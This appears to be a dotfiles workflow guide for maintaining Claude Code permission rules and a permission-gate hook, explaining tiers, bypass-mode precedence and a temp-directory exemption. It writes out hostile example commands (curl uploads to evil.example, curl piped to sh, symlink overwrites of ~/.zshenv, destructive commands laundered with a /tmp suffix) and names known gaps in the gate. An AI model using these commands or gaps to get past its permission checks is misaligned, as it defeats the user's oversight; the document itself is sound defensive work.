# Claude Code permission-rule change workflow

How to add or change a permission rule for Claude Code **without leaving the two
enforcement layers out of sync**. Read this whenever you're asked to allow, ask,
deny, or "stop prompting for" a Bash command.

This doc describes the *workflow*, not the current rule set — read the live files
for that:

- `~/.claude/settings.json` → source `dot_claude/settings.json` (**chezmoi-managed**)
- `~/.claude/permission-gate.sh`

## The two enforcement layers ("both places")

1. **Native declarative rules** in `settings.json` under
   `permissions.deny` / `.ask` / `.allow`. Patterns look like `Bash(git push *)`,
   are gitignore-style, and are **anchored to the start of the command** — so they
   do *not* match a command buried in a compound like `foo && git push`.

2. **The PreToolUse hook** `permission-gate.sh` (matcher `Bash`). It reads the command
   and `permission_mode` from stdin and can emit `permissionDecision: "ask"` to
   force a prompt. It matches **anywhere in the command string**, so it *is* what
   catches compound commands and odd flag forms the native rules miss.

Any change that adds/removes gating usually touches **one of these on purpose** —
but check the other so they don't contradict. (E.g. removing a native `ask` rule
does nothing if the hook still gates the same command.)

## Precedence — what actually wins

Effective order, most-restrictive-wins: **deny → hook decision → ask → allow**.

Mode behavior — this is the crux:

| Layer | Fires in normal modes? | Fires in `bypassPermissions`? |
|---|---|---|
| native `deny` | yes | yes |
| hook **tier 0** (allow, above everything) | yes | yes |
| native `ask` | yes | **yes** |
| hook **tier 1** (above the bypass short-circuit) | yes | **yes** |
| hook **tier 2** (the `case` below the short-circuit) | yes | **no** |
| native `allow` prompt | n/a (allows) | skipped |

`bypassPermissions` only skips the *allow*-stage prompting and the hook's tier-2
block. It does **not** skip native `deny`, native `ask`, or hook tier-1. That
asymmetry is the whole design: tier-1 = "prompt even in bypass", tier-2 = "prompt
except in bypass".

## The buckets — what each is for, and why

There are six buckets a command can land in. They exist because two independent
questions have to be answered separately: **"how hard do we stop this?"**
(deny/ask/allow) and **"does bypass mode get to skip the stop?"** (native vs. hook,
tier-1 vs. tier-2). No single list can express both, which is why the hook exists
alongside the native rules.

- **native `deny` — "never, under any circumstance."**
  Use when running the command is itself the harm and there's no legitimate case for
  a prompt (e.g. reading secret files). Deny is absolute and mode-independent; if
  you find yourself wanting "deny, but sometimes allow," it isn't a deny — it's an
  `ask`.

- **native `ask` — "always make me confirm, in every mode."**
  The reasoning is *irreversibility over convenience*: for actions you can't take
  back (`git push --force`, recursive `rm`), the cost of one confirmation keystroke
  is trivial next to the cost of the mistake, so you pay it even in bypass. Native
  `ask` is the right home when a simple leading pattern describes the command and you
  don't need to catch it inside a compound. Its limitation is the reason tier-1
  exists: it only matches the *start* of the command.

- **hook tier-1 — "always confirm, and don't let anything slip past."**
  Same intent as native `ask` (prompt in every mode, bypass included — tier-1 runs
  *before* the bypass short-circuit), but enforced in the hook because you need
  matching the native list can't do: substrings/compounds (`cd x && rm -rf y`), flag
  variants (`-r`, `-R`, `-rf`, `-fr`, `--recursive`), or absolute paths (`/bin/rm`).
  Pair it with a native `ask` backup so the guard survives the hook script going
  missing. Reach here only when the danger is severe enough to justify bypass-proof,
  compound-proof matching — otherwise native `ask` is simpler.

- **hook tier-0 — "this is scratch space; never ask me about it."**
  An escape hatch that runs *ahead of everything*, currently holding temp dirs
  (`/tmp`, `/private/tmp`). It emits an explicit `permissionDecision: "allow"`
  rather than exiting silently, and that distinction is the whole point: a silent
  exit is "no opinion," which falls through to the native `ask` list, so
  `rm -rf /tmp/x` would still prompt via `Bash(rm -r*)`. An explicit allow
  outranks native `ask` (see precedence above) while still losing to native
  `deny`. (Verified empirically — a `rm -rf` under `/tmp` runs with no prompt
  despite `Bash(rm -r*)` sitting in the ask list. Don't take it on faith if you
  upgrade; some published guidance claims hooks never bypass `ask`.)
  Use this bucket only for locations where the blast radius is genuinely nil.

  **The invariant: tier 0 never overrides another gate** — with one documented
  exception, `curl`, spelled out under condition 4. Because its allow
  outranks native `ask`, the bar is that a command must be provably *confined* to
  tmp — not merely that it *mentions* tmp. That distinction is the entire
  difference between an exemption and a universal bypass: if a temp mention alone
  were enough, `&& ls /tmp/x` would become a magic suffix that clears every other
  rule, and `git push --force origin main && ls /tmp/x` is a force push, not
  scratch work. The one carve-out is recursive `rm`, the case tier 0 exists for,
  and it is admitted only under the strictest check of the seven.

  Seven conditions. Each closes a different way back out of tmp:

  1. **It names a temp path.** Pattern match, `TMP_WORD`.
  2. **Every temp path it names really is in tmp.** Not a pattern match — this
     one asks the filesystem, via `resolve_root()` + `under_tmp()`. See below.
  3. **No path-like token points anywhere but tmp** (`tmp_scoped()`). Applied to
     every candidate, not just deletions: a command's danger isn't announced by
     its name, and `chmod`, `mv` and `tee` wreck `$HOME` as thoroughly as `rm`.
     `..` and command substitution are refused outright here, since neither can
     be resolved by inspection. An `http(s)` URL is exempt: it has slashes so it
     reads as path-like, but it isn't a filesystem path and can't be a write or
     delete target. Only `http`/`https` — `file://` is a path in disguise and
     scp-style `user@host:path` is a remote write.
  4. **No other gate already stops this command** (`GATED_CMD`: `ssh`, `sudo`,
     `wget`, `git`). This is the invariant made mechanical. `git` is listed whole
     rather than as `git push`, because `git clean -fdx` is just as destructive
     and no git operation is ever really "about tmp."

     **`curl` is the one deliberate exception**, and it does break the invariant:
     tier 2 gates `curl`, and a tmp-confined `curl` now overrides that. It's the
     carve-out the exemption was built for — fetching a reference file into a
     scratchpad was the single most common interruption. It stays safe because
     the other conditions still close around it: `curl -o ~/.zshrc`,
     `curl … > ~/x` and `curl … | sh` are all still stopped, by conditions 3 and
     5 rather than by this list, and a `curl` naming no temp path at all never
     reaches tier 0. What it concedes is network egress with no prompt inside an
     otherwise tmp-confined command — `curl -T /tmp/x https://…` uploads a
     scratch file unattended. `wget` stays gated; one door is enough.
  5. **Every command word is one we'll run unprompted** (`cmd_words_safe()`).
     Conditions 3 and 4 both reason about tokens that *look* like something —
     a path, a known-dangerous name. A bare word looks like neither, so
     `ls /tmp/x && npm publish` sails past both with nothing to object to. So the
     verb of each pipeline segment must appear in a short allowlist. Operands
     stay unrestricted — `echo hi > /tmp/x` has to keep working — but interpreters
     and archive extractors stay off the list, because their damage isn't bounded
     by the paths they name. Anything absent merely falls through to a prompt.
  6. **If it names `rm`, every token is accounted for** (`rm_tokens_scoped()`):
     a flag, an absolute temp path, or one of a few connectives — no bare words
     at all. This is stricter than condition 3 because a delete has no partial
     failure mode. `ls /tmp/x && rm -rf build` *passes* `tmp_scoped()`, since
     `build` has no slash and so isn't path-like, and would recursively delete a
     directory in the project's cwd. A trailing `/` (`rm -rf /tmp/link/` deletes
     *through* a symlink) and a bare `/tmp` are refused here too. Note this
     applies to every `rm`, not just recursive ones: `rm -f ~/.zshrc` is no less
     final for lacking a `-r`.
  7. **Every URL it fetches names an inert file type** (`urls_inert()`): `.pdf`,
     `.html`, `.txt`, `.json`, images, video/audio. Anything else — `.sh`, `.py`,
     `.dmg`, `.tar.gz`, `.exe`, or **no extension at all** (`curl
     https://sh.rustup.rs`) — falls through to tier 2's existing curl prompt.

     **This is not what stops a malicious download.** Condition 5 is: no
     interpreter, package manager, build tool or archive extractor is on the
     command allowlist, so `sh /tmp/x`, `python3 /tmp/x`, `npm install` and
     `tar -xf` all prompt regardless of what was fetched. A downloaded file is
     inert until something runs it, and running it is already gated.

     What condition 7 adds is *visibility*: fetching an executable is a statement
     of intent worth seeing, even when the follow-up would prompt anyway. Be
     honest about its limit — an extension describes what was **requested**, not
     what the server **sends**. `https://evil.example/cat.jpg` may return a
     script and will pass. It is a speed bump against carelessness, not a control
     against an adversary, and must never be cited as grounds for loosening
     anything else. Real control over what curl may reach is the sandbox's
     network allowlist, at the end of this doc.

     One side effect worth knowing: it narrowed condition 4's exfiltration
     concession without being designed to, since upload endpoints rarely end in
     an inert extension. `curl -T /tmp/x https://evil.example/up` now asks;
     `curl -T /tmp/x https://evil.example/up.pdf` still doesn't. Narrowed, not
     fixed.

  Failing condition 2 is different in kind from failing the rest: an unresolvable
  temp path is a positive danger signal, so it **asks**. Failing 3–7 only means
  "no opinion" — the command falls through to tiers 1 and 2 and the native rules,
  exactly as if tier 0 didn't exist.

  Note what this costs: `curl` into a scratchpad now prompts outside bypass mode,
  because condition 4 excludes it. That's deliberate. Downloading into `/tmp` is
  harmless to the *filesystem*, but `curl` is tier-2 gated for network egress,
  and tier 0 is not entitled to overrule that.

  **Why condition 2 can't be a regex.** A path that reads like `/tmp/x` points
  anywhere at all — `echo hi > /tmp/link` was verified overwriting a file in
  `$HOME`. So the hook resolves the deepest *existing* ancestor with `realpath`
  (a target that doesn't exist yet can't be a symlink; only the existing prefix
  can) and requires the result under a temp root. Globs are judged by the
  directory holding them, walking left until the glob is gone: `/tmp/link/*` is
  safe only if `/tmp/link` is.

  `under_tmp()` accepts **both** `/private/tmp` and `/tmp` because this file also
  deploys to Linux and WSL. macOS resolves `/tmp` to `/private/tmp`; everywhere
  else it resolves to itself. Accepting only the macOS form doesn't merely fail
  to help on Linux — it inverts the whole exemption into prompting on *every*
  temp path, since nothing would ever satisfy the check.

  **Dangling symlinks are the sharp edge of "deepest existing ancestor."** `-e`
  follows symlinks, so a broken link *looks* nonexistent and the walk climbs
  straight past it to `/tmp`, reporting a temp path — while the shell still
  creates the file at the link target. `resolve_root()` therefore stops on `-L`
  as well as `-e`, handing the link itself to `realpath`, which fails on it, and
  an empty result fails `under_tmp()`. Don't dismiss this as "it can only create
  a file that didn't exist": `~/.zshenv` doesn't exist by default either, and
  every shell sources it.

  **A temp path that resolves out of tmp must `ask`, never just fall through.**
  Falling through means "no opinion," which lands on the native allow list, and
  `Bash(echo *)` will happily run `echo x > /tmp/link` into `$HOME` unprompted.
  Declining to allow is not the same as denying.

  This is why the hook also matches `Read`/`Write`/`Edit`, not just `Bash`: the
  native `Write(/tmp/**)` allow rules match the path as a *string*, so a symlink
  named `/tmp/x` satisfies them too. Same resolution check, same answer.

  Remaining limits, accepted:

  - **Relative targets always prompt.** `rm -rf build` and `rm -rf ./build` both
    fall through, because the hook never sees the command's cwd and so cannot
    tell scratch space from the project root. Conditions 5 and 6 turn that
    blindness into a prompt rather than a guess.
  - **Over-prompting on slash-bearing arguments that aren't paths.** `sed -i ""
    s/a/b/ /tmp/x` falls through, since `tmp_scoped()` reads `s/a/b/` as a
    non-temp path. Wrong for the right reason — it fails toward asking.
  - **Time-of-check/time-of-use.** Resolution is a snapshot, so a symlink swapped
    between the check and the command beats it. That one needs kernel
    enforcement, i.e. the sandbox below.

  When extending the command allowlist in condition 5, the test to apply is not
  "is this command safe?" but "is this command's damage bounded by the paths it
  names?" — because conditions 3 and 6 only constrain paths. `tar` fails that
  test (`tar -xf /tmp/e.tar` extracts into the cwd), and so does any interpreter.

- **hook tier-2 — "confirm normally, but trust me in bypass."**
  This is the bucket the whole setup was built for. These commands are risky enough
  to want a check during ordinary work (`ssh`, `curl`, `wget`, `sudo`, non-force
  `git push`) but *not* so dangerous that you'd want them to interrupt an explicit
  bypass session, where you've deliberately opted into "don't ask me about routine
  things." Tier-2 sits *below* the bypass short-circuit, so bypass silences it. If a
  command is reversible and its risk is context-dependent, it belongs here.

- **native `allow` — "routine, never worth a prompt."**
  Read-only or trivially-safe commands (`ls`, `cat`, `git status`). The reasoning is
  the inverse of `ask`: prompting on these is pure friction with no upside. Note the
  hook can still override an `allow` (precedence puts the hook ahead of `allow`),
  which is how a broad `allow` entry plus a tier gate coexist without contradiction.

The dividing lines, stated as the two questions:
1. **Reversible?** If no → `ask`/tier-1 (confirm every mode). If yes → tier-2 or
   `allow`.
2. **Should bypass skip the prompt?** If no → native `ask` or tier-1. If yes →
   tier-2 (gated normally, silent in bypass) or `allow` (never gated).

## Decide where a new rule goes

| You want… | Put it in |
|---|---|
| Hard block, command never runs | native `permissions.deny` |
| Always prompt, every mode, simple leading pattern | native `permissions.ask` |
| Always prompt every mode **and** catch compound / odd flags / be bypass-proof | hook **tier 1** (before the bypass short-circuit) — optionally a native `ask` as a backup if the hook script goes missing |
| Prompt in normal modes, **silent under bypass** | hook **tier 2** (the `case "$cmd"` block) |
| Always run silently | native `permissions.allow` |
| Never prompt, **even over a native `ask`** (scratch dirs) | hook **tier 0** — must emit an explicit `allow`, not `exit 0` |

## Make the change

- **Native rule:** edit the relevant array in the **source** (`dot_claude/settings.json`).
  Use `Bash(<pattern> *)`. Remember it only matches the start of the command.
- **Hook tier 2** (normal-ask / bypass-silent): add a glob to the `case "$cmd"`
  block, e.g. `*'docker '*)`.
- **Hook tier 1** (every-mode, bypass-proof): add a `grep`/`case` test **above** the
  `[ "$mode" = "bypassPermissions" ] && exit 0` line so it runs before bypass can
  short-circuit.

### The bypass trap (read before "let X run in bypass")

To truly let a currently-gated command run silently in bypass you must relax **both**
layers: move/remove it from the hook **and** delete any native `ask` rule for it —
because native `ask` still fires in bypass. Touching only one leaves it prompting.

The same trap applies in *every* mode, not just bypass, and it's why tier-0 exists:
dropping a command from the hook only demotes it to "no opinion," and a surviving
native `ask` then prompts anyway. Emitting an explicit `allow` from the hook is the
one move that overrides a native `ask` without deleting it — which is how
`rm -rf /tmp/x` runs silently while `Bash(rm -r*)` stays in place as the backup for
every path that isn't scratch space.

## chezmoi: both files are managed — edit the source, not the live copy

Both `settings.json` and `permission-gate.sh` are deployed by chezmoi, so **edit the
source, not the live copy** (see `managed-dotfiles-policy.md`):

- `~/.claude/settings.json` → `dot_claude/settings.json`
- `~/.claude/permission-gate.sh` → `dot_claude/executable_permission-gate.sh`
  (the `executable_` prefix preserves the `+x` bit; the script carries the standard
  managed-file disclaimer after its shebang. `settings.json` is strict JSON so it
  can't — confirm it's managed with `chezmoi source-path` instead.)

```bash
chezmoi source-path ~/.claude/settings.json   # -> dot_claude/settings.json (managed)
chezmoi diff ~/.claude/permission-gate.sh     # preview source-vs-live before apply
```

Two valid ways to edit either file:

- Edit the source in the repo, then `chezmoi apply`, **or**
- Edit the live `~/.claude/…` copy, then pull it back with
  `chezmoi re-add ~/.claude/<file>`.

Never `chezmoi apply --force` over a drifted live file — it discards live changes.

## Verify after any change

**Run the test suite first — it is the cheapest check and the only one that
covers tier 0's seven conditions:**

```bash
sh tests/permission-gate-test.sh    # exits non-zero on any failure
```

It tests the source copy, so run it *before* `chezmoi apply`. Most of its cases
are laundering attempts — a destructive command carrying an incidental `/tmp`
mention — because tier 0's allow outranks native `ask`, which makes a false
allow the failure mode that silently disarms everything else. Add a case for
every hole you close; several conditions exist only because a specific string
got through, and the test is what stops it coming back.

Then the manual checks:

```bash
# 1. settings.json is still valid JSON
jq . ~/.claude/settings.json >/dev/null && echo OK

# 2. Exercise the hook directly (test BOTH modes for gated commands)
echo '{"tool_input":{"command":"sudo reboot"},"permission_mode":"default"}' | ~/.claude/permission-gate.sh
echo '{"tool_input":{"command":"sudo reboot"},"permission_mode":"bypassPermissions"}' | ~/.claude/permission-gate.sh
```

Expect JSON containing `"permissionDecision":"ask"` when it should prompt, and empty
output when it should stay silent. Back up first: `cp ~/.claude/settings.json{,.bak}`.

Note: the hook matches textually, so it can over-prompt on string literals like
`echo "rm -rf /"`. That's intentional — it fails safe toward prompting.

## The sandbox is the better tool for "stop asking me about scratch space"

Everything above is text matching, which is inherently guessy: it can't resolve a
symlink, can't know the cwd, can't see what `$(...)` expands to. Claude Code ships
an OS-level alternative that can — `/sandbox`, using Seatbelt on macOS and
bubblewrap on Linux. It confines Bash to a declared set of writable paths and
network domains, and in **auto-allow mode** sandboxed commands run with no prompt
at all, because the kernel boundary *is* the approval.

Why it fits this use case specifically:

- The session temp directory is writable inside the sandbox by default, alongside
  the working directory, so scratch work needs no rules at all.
- Even in auto-allow mode, `rm`/`rmdir` targeting `/`, `$HOME`, or other critical
  paths **still** prompts — the guard is kept exactly where tier-0 wanted it
  dropped, and enforced rather than pattern-matched.
- Explicit `deny` rules are still respected.

One interaction to know: content-scoped ask rules like `Bash(git push *)` and
`Bash(rm -r*)` still force a prompt even for sandboxed commands. So the sandbox
alone does *not* silence `rm -rf` in tmp — the native `ask` rule outlives it, and
hook tier-0 is still what overrides that. The two are complementary: the sandbox
bounds the blast radius, tier-0 removes the prompt.

Deliberately **not** enabled here yet — it changes how every Bash command runs
(commands needing broad filesystem or network access fail and retry unsandboxed,
new network domains prompt on first use), and that blast radius wasn't wanted
just to quiet temp-dir prompts. Tier-0's filesystem resolution covers the temp
case without it.

Worth revisiting when the goal grows past "stop asking about scratch space" to
"bound what the agent can reach at all" — the one thing tier-0 structurally
cannot do is survive a symlink swapped between check and use, because only the
kernel sees the syscall.
